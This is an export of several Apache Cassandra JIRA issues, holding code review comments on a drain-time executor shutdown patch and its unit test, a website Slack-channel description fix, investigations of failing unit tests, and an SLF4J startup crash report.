-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();
-            setMode(Mode.DRAINED, !isFinalShutdown);
+
+            try
+            {
+                ScheduledExecutors.shutdownNowAndWait(1, MINUTES);

Review Comment:
   Did you think through the consequences of also shutting down `scheduledFastTasks` here too? `approxTime()` will stop updating and tests like `isAfter()` will get stuck returning `false` even as real time passes.
   
   As `drain()` can be called by `nodetool` independently of the shutdown hook, is there any functionality that will be impacted by `approxTime` sticking until the node is finally shutdown?



##########
test/unit/org/apache/cassandra/service/StorageServiceTest.java:
##########
@@ -156,4 +169,30 @@ public void testGetChangedReplicasForLeaving() throws Exception
         expectedResult.put(new Replica(aAddress, dRange, false), new Replica(bAddress, dRange, false));
         assertMultimapEqualsIgnoreOrder(result, expectedResult.build());
     }
+
+    @Test
+    public void testScheduledExecutorsShutdownOnDrain() throws Throwable
+    {
+        final AtomicReference<Integer> numberOfRuns = new AtomicReference<>(0);
+
+        ScheduledExecutors.scheduledTasks.scheduleAtFixedRate(() -> numberOfRuns.updateAndGet(i -> i + 1),
+                                                              0, 20, SECONDS);
+
+        // we expect three runs, at time 0s, 20s and 40s
+        logger.info(""Sleeping for 45 seconds to verify scheduled executor was shut down."");
+        Thread.sleep(45_000);
+
+        StorageService.instance.drain();
+
+        // wait another 20s, by that time, if the draining does not work
+        // we would see 4th counter run which would fail the test
+        Thread.sleep(20_000);
+
+        assertEquals(3, numberOfRuns.get().intValue());
+
+        assertTrue(ScheduledExecutors.scheduledTasks.isTerminated());
+        assertTrue(ScheduledExecutors.nonPeriodicTasks.isTerminated());
+        assertTrue(ScheduledExecutors.scheduledFastTasks.isTerminated());
+        assertTrue(ScheduledExecutors.optionalTasks.isTerminated());
+    }

Review Comment:
   I think this would be a more sympathetic test for CI - rather than taking 65second.



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Why did you move the shutdownPostFlushExecutor ahead of the refactored non-periodic executor termination?
   
   I couldn't find any tasks that obviously scheduled on the post flush executor that should still be running - it looks mostly related to the commit log and column family truncation which should not be possible on the node at this point in the drain.
   
   So I think this is safe, but was wondering if there was a reason for it or it was an incidental change.



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();
-            setMode(Mode.DRAINED, !isFinalShutdown);
+
+            try
+            {
+                ScheduledExecutors.shutdownNowAndWait(1, MINUTES);
+            }
+            finally
+            {
+                setMode(Mode.DRAINED, !isFinalShutdown);

Review Comment:
   Interesting when a node should decide it is `DRAINED` if there's an exception. You can't attempt draining again if an exception is thrown after the collection of mutation stages. I'm guessing you structured it like this so you would retain behavior on timeout from the scheduled executor shutdown as before.



##########
test/unit/org/apache/cassandra/service/StorageServiceTest.java:
##########
@@ -156,4 +169,30 @@ public void testGetChangedReplicasForLeaving() throws Exception
         expectedResult.put(new Replica(aAddress, dRange, false), new Replica(bAddress, dRange, false));
         assertMultimapEqualsIgnoreOrder(result, expectedResult.build());
     }
+
+    @Test
+    public void testScheduledExecutorsShutdownOnDrain() throws Throwable
+    {
+        final AtomicReference<Integer> numberOfRuns = new AtomicReference<>(0);
+
+        ScheduledExecutors.scheduledTasks.scheduleAtFixedRate(() -> numberOfRuns.updateAndGet(i -> i + 1),
+                                                              0, 20, SECONDS);
+
+        // we expect three runs, at time 0s, 20s and 40s
+        logger.info(""Sleeping for 45 seconds to verify scheduled executor was shut down."");
+        Thread.sleep(45_000);
+
+        StorageService.instance.drain();
+
+        // wait another 20s, by that time, if the draining does not work
+        // we would see 4th counter run which would fail the test
+        Thread.sleep(20_000);
+
+        assertEquals(3, numberOfRuns.get().intValue());
+
+        assertTrue(ScheduledExecutors.scheduledTasks.isTerminated());
+        assertTrue(ScheduledExecutors.nonPeriodicTasks.isTerminated());
+        assertTrue(ScheduledExecutors.scheduledFastTasks.isTerminated());
+        assertTrue(ScheduledExecutors.optionalTasks.isTerminated());
+    }

Review Comment:
   ```suggestion
       @Test
       public void testScheduledExecutorsShutdownOnDrain() throws Throwable
       {
           final AtomicInteger numberOfRuns = new AtomicInteger(0);
   
           ScheduledFuture<?> f = ScheduledExecutors.scheduledTasks.scheduleAtFixedRate(() -> numberOfRuns.incrementAndGet(),
                                                                                    0, 1, MILLISECONDS);
   
           // Prove the task was scheduled more than once before checking cancelled.
           Awaitility.await(""first run"").atMost(1, TimeUnit.MINUTES).until(() -> numberOfRuns.get() > 1);
   
           assertFalse(f.isCancelled());
           StorageService.instance.drain();
           assertTrue(f.isCancelled());
   
           assertTrue(ScheduledExecutors.scheduledTasks.isTerminated());
           assertTrue(ScheduledExecutors.nonPeriodicTasks.isTerminated());
           assertTrue(ScheduledExecutors.scheduledFastTasks.isTerminated());
           assertTrue(ScheduledExecutors.optionalTasks.isTerminated());
       }
   ```



;12/Apr/22 23:59;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849227272


##########
test/unit/org/apache/cassandra/service/StorageServiceTest.java:
##########
@@ -156,4 +169,30 @@ public void testGetChangedReplicasForLeaving() throws Exception
         expectedResult.put(new Replica(aAddress, dRange, false), new Replica(bAddress, dRange, false));
         assertMultimapEqualsIgnoreOrder(result, expectedResult.build());
     }
+
+    @Test
+    public void testScheduledExecutorsShutdownOnDrain() throws Throwable
+    {
+        final AtomicReference<Integer> numberOfRuns = new AtomicReference<>(0);
+
+        ScheduledExecutors.scheduledTasks.scheduleAtFixedRate(() -> numberOfRuns.updateAndGet(i -> i + 1),
+                                                              0, 20, SECONDS);
+
+        // we expect three runs, at time 0s, 20s and 40s
+        logger.info(""Sleeping for 45 seconds to verify scheduled executor was shut down."");
+        Thread.sleep(45_000);
+
+        StorageService.instance.drain();
+
+        // wait another 20s, by that time, if the draining does not work
+        // we would see 4th counter run which would fail the test
+        Thread.sleep(20_000);
+
+        assertEquals(3, numberOfRuns.get().intValue());
+
+        assertTrue(ScheduledExecutors.scheduledTasks.isTerminated());
+        assertTrue(ScheduledExecutors.nonPeriodicTasks.isTerminated());
+        assertTrue(ScheduledExecutors.scheduledFastTasks.isTerminated());
+        assertTrue(ScheduledExecutors.optionalTasks.isTerminated());
+    }

Review Comment:
   ah yes this is better way how to look at it, I couldnt remember that AtomicInteger as I was in the rush :D No problem with Awaitility either.



;13/Apr/22 08:36;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 29 12:18:17 UTC 2022,,,,,,,All,,,,"0|z10vsg:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/fd1f245353584833b8569666c115c6c64755c2c9,,,,,,,,,run CI,,,,,"28/Mar/22 16:16;brandon.williams;For 3.0, we just need the suppression:

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17492-3.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/414/workflows/159690c3-10d6-4db5-8718-1b0af45f23b9]|

For 3.11, the suppression and the jackson upgrade:

||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17492-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/413/workflows/63bc3974-7ce7-48f7-91be-d45c43bda190]|

;;;","29/Mar/22 04:53;bereng;LGTM +1;;;","29/Mar/22 12:18;brandon.williams;Committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WEBSITE - Descriptions of Slack channels in Community section is incorrect,CASSANDRA-17491,13436017,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,erickramirezau,brandon.williams,brandon.williams,27/Mar/22 11:34,25/Aug/22 11:23,13/Jul/23 08:40,01/Jun/22 13:11,NA,,,,,,Documentation/Website,,,,0,,"https://cassandra.apache.org/_/community.html#how-to-contribute

Among other things, this says #cassandra-dev is for results of automated builds.

 !Screenshot_20220327_063323.png|width=500! ",,erickramirezau,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Mar/22 11:34;brandon.williams;Screenshot_20220327_063323.png;https://issues.apache.org/jira/secure/attachment/13041653/Screenshot_20220327_063323.png","28/Mar/22 04:33;erickramirezau;c17491-02-proposed_layout.png;https://issues.apache.org/jira/secure/attachment/13041664/c17491-02-proposed_layout.png","01/Jun/22 13:18;erickramirezau;c17491-03-community_page.png;https://issues.apache.org/jira/secure/attachment/13044514/c17491-03-community_page.png",,,3.0,erickramirezau,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 01 13:28:07 UTC 2022,,,,,,,All,,,,"0|z10v1s:",9223372036854775807,,,,brandon.williams,erickramirezau,,,Normal,,4.0.0,,https://github.com/apache/cassandra-website/commit/700ff74c4de50e230b0b8ccbaaa6e051a9e4895a,,,,,,,,,Stage locally and verify doc updates render as expected,,,,,"28/Mar/22 04:36;erickramirezau;[~brandon.williams] the formatting is unfortunate because there isn't any space *after* the button and the description for the next button.

How about if I add a blank line *before* the description for each button like this so there's a clear separation between them?

!c17491-02-proposed_layout.png|width=500!

Let me know either way. Cheers! 🍻;;;","28/Mar/22 06:23;erickramirezau;Patch:
||Branch||PR||
|{{trunk}}|[#118|https://github.com/apache/cassandra-website/pull/118]|;;;","28/Mar/22 11:23;brandon.williams;That works for me, +1.;;;","01/Jun/22 13:09;erickramirezau;Submitted a new patch:

||Branch||PR||
|{{trunk}}|[#136|https://github.com/apache/cassandra-website/pull/136]|

 !c17491-03-community_page.png|width=300!;;;","01/Jun/22 13:11;erickramirezau;Committed:
||Branch||PR||Commit||
|{{trunk}}|[#136|https://github.com/apache/cassandra-website/pull/136]|[700ff74 |https://github.com/apache/cassandra-website/commit/700ff74c4de50e230b0b8ccbaaa6e051a9e4895a]|;;;","01/Jun/22 13:13;erickramirezau;The website content is getting built in staging:

||Branch||PR||Commit||Build||
|{{trunk}}|[#136|https://github.com/apache/cassandra-website/pull/136]|[700ff74 |https://github.com/apache/cassandra-website/commit/700ff74c4de50e230b0b8ccbaaa6e051a9e4895a]|[#307|https://ci-cassandra.apache.org/job/cassandra-website/307/]|;;;","01/Jun/22 13:24;erickramirezau;Th updated Community page is now in staging -- https://cassandra.staged.apache.org/_/community.html;;;","01/Jun/22 13:28;erickramirezau;I've completed final verification in staging and [published to production|https://github.com/apache/cassandra-website#merging-asf-staging-to-asf-site]:
{noformat}
$ git branch
* trunk

$ git fetch origin
$ git checkout asf-site
Branch 'asf-site' set up to track remote branch 'asf-site' from 'origin'.
Switched to a new branch 'asf-site'

$ git branch
* asf-site
  trunk

$ git reset --hard origin/asf-staging
HEAD is now at ddeb63d1 generate docs for 700ff74c

$ git push -f origin asf-site
Username for 'https://github.com': erickramirezau
Password for 'https://erickramirezau@github.com': 
Total 0 (delta 0), reused 0 (delta 0) 
To https://github.com/apache/cassandra-website.git
 + 68a1b82a...ddeb63d1 asf-site -> asf-site (forced update){noformat}
The updated Community page is now live on the site – https://cassandra.apache.org/_/community.html;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failures: org.apache.cassandra.metrics and a few others failing (utests_system_keyspace_directory on circleci),CASSANDRA-17489,13435883,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Urgent,Fixed,bdeggleston,e.dimitrova,e.dimitrova,25/Mar/22 19:39,05/Oct/22 22:22,13/Jul/23 08:40,12/Jul/22 12:18,4.1-beta1,,,,,,CI,,,,0,,"There are 10 tests failing in CircleCI - utests_system_keyspace_directory
This test target is not presented in Jenkins.
 
The tests fail for the same reason:


{code:java}
java.lang.RuntimeException: java.nio.file.NoSuchFileException: build/test/cassandra/data/system/_paxos_repair_state/ballot.meta.tmp at org.apache.cassandra.io.util.SequentialWriter.openChannel(SequentialWriter.java:128) at org.apache.cassandra.io.util.SequentialWriter.<init>(SequentialWriter.java:161) at org.apache.cassandra.io.util.SequentialWriter.<init>(SequentialWriter.java:150) at org.apache.cassandra.service.paxos.uncommitted.PaxosBallotTracker.flush(PaxosBallotTracker.java:130) at org.apache.cassandra.service.paxos.uncommitted.PaxosStateTracker.maybeRebuild(PaxosStateTracker.java:309) at org.apache.cassandra.service.paxos.PaxosState.maybeRebuildUncommittedState(PaxosState.java:122) at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:368) at org.apache.cassandra.service.CassandraDaemon.init(CassandraDaemon.java:655) at org.apache.cassandra.service.EmbeddedCassandraService.start(EmbeddedCassandraService.java:50) at org.apache.cassandra.metrics.CQLMetricsTest.setup(CQLMetricsTest.java:53) Caused by: java.nio.file.NoSuchFileException: build/test/cassandra/data/system/_paxos_repair_state/ballot.meta.tmp at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) at sun.nio.fs.UnixFileSystemProvider.newFileChannel(UnixFileSystemProvider.java:177) at java.nio.channels.FileChannel.open(FileChannel.java:287) at java.nio.channels.FileChannel.open(FileChannel.java:335) at org.apache.cassandra.io.util.SequentialWriter.openChannel(SequentialWriter.java:113){code}
The tests started failing every time after CEP 14 was committed.

For reference:
 * build before - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1484/workflows/88cac38a-ee0c-46e2-a6a7-5c364ff04f3e/jobs/9680
 * build after - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1485/workflows/c3f56ec1-2ef0-4e61-b689-c7764934827d/jobs/9682]

I think the only unrelated is 
{code:java}
testTokenGenerator_single_rack_or_single_rf{code}",,adelapena,bdeggleston,benedict,bereng,blerer,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bdeggleston,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jul 12 12:18:36 UTC 2022,,,,,,,All,,,,"0|z10u80:",9223372036854775807,,,,bereng,blerer,,,Critical,,4.1-alpha1,,https://github.com/apache/cassandra/commit/cdc0ce1fa33756f091785b58d4cc8f50fa9e7d0e,,,,,,,,,circle ci,,,,,"25/Mar/22 19:41;e.dimitrova; Ping [~benedict], those got broken after the Paxos improvements were committed. Please check;;;","25/Mar/22 19:46;benedict;Thanks Ekaterina, I don't recall seeing these break at commit, so I wonder if this is something to do with test cleanup. I'm on vacation at the moment, and perhaps [~bdeggleston] is not (or will be back sooner). He's probably the better person to look at this issue anyway.;;;","10/May/22 18:42;dcapwell;marking 4.1 blocker;;;","19/May/22 09:23;bereng;Some findings to repro I hope will save some time to whoever takes this one:

It doesn't repro with the std {{test}} targets but with {{ant testclasslist-system-keyspace-directory -Dtest.classlistfile=tests.txt}} only. I've trimmed it down so these are the minimal contents of the tests.txt file:

{noformat}
org/apache/cassandra/transport/CQLUserAuditTest.java
{noformat}

That reliably repros the problem. I've pinned it down to the the following concat {{<fileset file=""${test.conf}/system_keyspaces_directory.yaml""/>}} in the {{testlist-system-keyspace-directory}} definition. Toggling that on/off fails/passes the test.

Finger in the air, this smells like some init problem within the paxos code. I hope that should be easy to pin down by sbdy familiar with the codebase and also sounds as a common cause to those failures. #my2cts #collaborating;;;","01/Jun/22 14:39;e.dimitrova;[~benedict], [~bdeggleston] did anyone of you have the time to look into those?

 Pre-commit  system-keyspace-directory tests were not run as at that point they were not mandatory pre-commit (corrected for visibility the other day as they are not run in Jenkins at the moment). These are the last consistently failing tests for 4.1 and trunk (only a few flakes out there);;;","06/Jun/22 11:24;benedict;[~bdeggleston] I think this is your wheel house? Would you mind taking a peek?;;;","08/Jun/22 16:31;bdeggleston;Sure, I'll try to get to it by the end of the week;;;","14/Jun/22 21:31;bdeggleston;trunk: https://github.com/bdeggleston/cassandra/tree/CASSANDRA-17489
circle: https://app.circleci.com/pipelines/github/bdeggleston/cassandra?branch=CASSANDRA-17489&filter=all

These tests were 'double initializing' parts of the daemon with both the SchemaLoader and EmbeddedDaemon, including the paxos bookeeping, so then the system directory tests ran, which relocate the system data directory, the paxos directory was being moved after the path had already been set in memory. This was fixed by not inheriting the test classes from SchemaLoader, and doing any initial set after {{cassandra.start()}};;;","14/Jun/22 21:32;bdeggleston;[~benedict] [~e.dimitrova] would either of you be able to review?;;;","15/Jun/22 05:51;bereng;[~bdeggleston] I am afraid you didn't start the tests and I can't start them for you unfortunately?;;;","16/Jun/22 20:09;bdeggleston;[~Bereng] oops, I haven't interacted with the new circle configs yet. Everything looks ok with the utests/system keyspace tests. I ended up rewriting this as the first solution didn't fix everything. Now it sets a global update handler to avoid initializing the paxos machinery ahead of test setup;;;","17/Jun/22 11:59;adelapena;CI looks good, the failure of {{SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie}} seems due to the branch missing the fix for CASSANDRA-17458. Probably we should try to run CI again after a rebase, just in case.;;;","20/Jun/22 05:39;bereng;I see the branch is like 20d old so I would also suggest a rebase + run the pre_commit section of CI as the patch touches code, so we want to see dtests, jvm dtests, etc also being tested?;;;","21/Jun/22 19:05;bdeggleston;rebased and re-ran;;;","22/Jun/22 05:02;bereng;Aaaaaand I know I am starting to be a pain but can you trigger {{java8_pre-commit_tests/start_pre-commit_tests}} and the same for j11 please? :-);;;","22/Jun/22 16:14;bdeggleston;started (y);;;","23/Jun/22 05:06;bereng;I can't comment on the paxos code as it's sthg I am not familiar with, but now all tests are passing.

Note: we're missing a 4.1 PR correct?;;;","23/Jun/22 15:54;bdeggleston;4.1: [https://github.com/bdeggleston/cassandra/tree/CASSANDRA-17489-4.1]

circle: [https://app.circleci.com/pipelines/github/bdeggleston/cassandra?branch=CASSANDRA-17489-4.1&filter=all];;;","27/Jun/22 08:31;bereng;LGTM +1 [~bdeggleston]. But feel free to disregard it if you want sbdy to review thoroughly your paxos changes.;;;","06/Jul/22 12:44;blerer;The patch look good to me. Thanks [~bdeggleston];;;","12/Jul/22 12:18;blerer;Committed into cassandra-4.1 at 239b3e50798d80fe81ceb56db3c5c869d675a8e3 and merged into trunk ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent failure on org.apache.cassandra.io.sstable.LegacySSTableTest.testStreamLegacyCqlTables,CASSANDRA-17482,13435565,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,adelapena,adelapena,24/Mar/22 12:35,27/May/22 19:25,13/Jul/23 08:40,25/Mar/22 13:17,4.0.4,4.1,4.1-alpha1,,,,Test/unit,,,,0,,"Intermittent failure on {{org.apache.cassandra.io.sstable.LegacySSTableTest.testStreamLegacyCqlTables}} after CASSANDRA-17048:

* https://ci-cassandra.apache.org/job/Cassandra-trunk/1040/testReport/org.apache.cassandra.io.sstable/LegacySSTableTest/testStreamLegacyCqlTables/
* https://ci-cassandra.apache.org/job/Cassandra-trunk/1039/testReport/org.apache.cassandra.io.sstable/LegacySSTableTest/testStreamLegacyCqlTables/

{code}
Failed 2 times in the last 3 runs. Flakiness: 50%, Stability: 33%
Error Message
Invalid sstable file na-1-bti-Filter.db: unknown 'format' part (bti)
Stacktrace
java.lang.IllegalArgumentException: Invalid sstable file na-1-bti-Filter.db: unknown 'format' part (bti)
	at org.apache.cassandra.io.sstable.Descriptor.invalidSSTable(Descriptor.java:318)
	at org.apache.cassandra.io.sstable.Descriptor.fromFilenameWithComponent(Descriptor.java:276)
	at org.apache.cassandra.io.sstable.Descriptor.fromFilename(Descriptor.java:216)
	at org.apache.cassandra.io.sstable.LegacySSTableTest.getDescriptor(LegacySSTableTest.java:148)
	at org.apache.cassandra.io.sstable.LegacySSTableTest.streamLegacyTable(LegacySSTableTest.java:423)
	at org.apache.cassandra.io.sstable.LegacySSTableTest.streamLegacyTables(LegacySSTableTest.java:414)
	at org.apache.cassandra.io.sstable.LegacySSTableTest.testStreamLegacyCqlTables(LegacySSTableTest.java:299)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}
Repeated iterations on CircleCI indicates a 4% flakiness:
https://app.circleci.com/pipelines/github/adelapena/cassandra/1421/workflows/916a4466-92e8-4115-b4e2-1a951722f409/jobs/14212",,adelapena,blerer,jlewandowski,,,,,,,,,,,,"smiklosovic closed pull request #1525:
URL: https://github.com/apache/cassandra/pull/1525


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;26/Mar/22 12:23;githubbot;600","smiklosovic closed pull request #1523:
URL: https://github.com/apache/cassandra/pull/1523


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;26/Mar/22 12:23;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,CASSANDRA-17048,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Mar 25 13:16:48 UTC 2022,,,,,,,All,,,,"0|z10sag:",9223372036854775807,,,,adelapena,,,,Low,,4.1,,https://github.com/apache/cassandra/commit/05fa92475ccb2beb70a96ddee83c04b65a2cdbfb,,,,,,,,,unit tests,,,,,"24/Mar/22 13:49;jlewandowski;https://github.com/apache/cassandra/pull/1523;;;","24/Mar/22 15:08;adelapena;||PR||CI||
|[trunk|https://github.com/apache/cassandra/pull/1523]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1426/workflows/074fcabf-e490-431c-be91-a005bb5ba770] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1426/workflows/440f840a-9f73-45f2-b8ef-4327402db6e0]|;;;","24/Mar/22 15:14;adelapena;We'd need to remove those also from 4.0.;;;","24/Mar/22 16:53;adelapena;The patch for trunk and CI look good to me, +1. The patch for 4.0 should be identical:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1525]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1429/workflows/de625f90-7959-47c1-b46e-1162f8f7b38d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1429/workflows/120f4f86-98a8-48da-9dba-2d557c3a03dc]|
|[trunk|https://github.com/apache/cassandra/pull/1523]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1426/workflows/074fcabf-e490-431c-be91-a005bb5ba770] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1426/workflows/440f840a-9f73-45f2-b8ef-4327402db6e0]|
[~blerer] could you please take a look?;;;","25/Mar/22 08:18;blerer;+1;;;","25/Mar/22 13:16;adelapena;Committed to 4.0 as [05fa92475ccb2beb70a96ddee83c04b65a2cdbfb|https://github.com/apache/cassandra/commit/05fa92475ccb2beb70a96ddee83c04b65a2cdbfb] and merged up to [trunk|https://github.com/apache/cassandra/commit/cd870fe645305d934c5f1799c4c7c9e6b8b7d1e3].

Thanks for both the fix and the review.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed to instantiate SLF4J LoggerFactory in Cassandra 3.11.12,CASSANDRA-17474,13435330,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,tobiasg,tobiasg,23/Mar/22 11:01,31/Mar/22 12:24,13/Jul/23 08:40,31/Mar/22 12:24,3.11.13,,,,,,Build,,,,0,,"After upgrading to 3.11.12, Cassandra crashes on startup because of a class that cannot be found in slf4j.

{code}

Failed to instantiate SLF4J LoggerFactory
Reported exception:
java.lang.NoClassDefFoundError: org/slf4j/event/LoggingEvent
    at java.lang.Class.getDeclaredMethods0(Native Method)
    at java.lang.Class.privateGetDeclaredMethods(Class.java:2701)
    at java.lang.Class.privateGetPublicMethods(Class.java:2902)
    at java.lang.Class.getMethods(Class.java:1615)
    at ch.qos.logback.core.joran.util.beans.BeanDescriptionFactory.create(BeanDescriptionFactory.java:35)
    at ch.qos.logback.core.joran.util.beans.BeanDescriptionCache.getBeanDescription(BeanDescriptionCache.java:47)
    at ch.qos.logback.core.joran.util.PropertySetter.<init>(PropertySetter.java:68)
    at ch.qos.logback.core.joran.action.NestedComplexPropertyIA.isApplicable(NestedComplexPropertyIA.java:65)
    at ch.qos.logback.core.joran.spi.Interpreter.lookupImplicitAction(Interpreter.java:233)
    at ch.qos.logback.core.joran.spi.Interpreter.getApplicableActionList(Interpreter.java:252)
    at ch.qos.logback.core.joran.spi.Interpreter.startElement(Interpreter.java:142)
    at ch.qos.logback.core.joran.spi.Interpreter.startElement(Interpreter.java:128)
    at ch.qos.logback.core.joran.spi.EventPlayer.play(EventPlayer.java:50)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:165)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:152)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:110)
    at ch.qos.logback.core.joran.GenericConfigurator.doConfigure(GenericConfigurator.java:53)
    at ch.qos.logback.classic.util.ContextInitializer.configureByResource(ContextInitializer.java:65)
    at ch.qos.logback.classic.util.ContextInitializer.autoConfig(ContextInitializer.java:140)
    at org.slf4j.impl.StaticLoggerBinder.init(StaticLoggerBinder.java:84)
    at org.slf4j.impl.StaticLoggerBinder.<clinit>(StaticLoggerBinder.java:55)
    at org.slf4j.LoggerFactory.bind(LoggerFactory.java:129)
    at org.slf4j.LoggerFactory.performInitialization(LoggerFactory.java:108)
    at org.slf4j.LoggerFactory.getILoggerFactory(LoggerFactory.java:302)
    at org.slf4j.LoggerFactory.getLogger(LoggerFactory.java:276)
